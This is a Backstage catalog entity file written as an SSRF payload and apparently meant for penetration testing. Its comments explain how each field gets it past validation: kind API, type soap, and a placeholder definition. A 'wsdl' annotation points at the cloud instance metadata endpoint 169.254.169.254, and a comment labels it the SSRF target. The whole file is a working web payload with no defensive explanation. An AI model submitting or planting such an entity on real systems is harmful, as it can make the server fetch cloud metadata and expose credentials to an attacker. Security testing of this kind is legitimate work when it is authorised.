apiVersion: backstage.io/v1alpha1
kind: API                      # gate #1
metadata:
  name: pentest-soap-ssrf
  annotations:
    wsdl: http://169.254.169.254/latest/meta-data/   # gate #4 — THE SSRF target (not allow-listed)
spec:
  type: soap                   # gate #2
  lifecycle: experimental
  owner: guest
  definition: |                # required for kind: API, so the entity passes validation
    placeholder
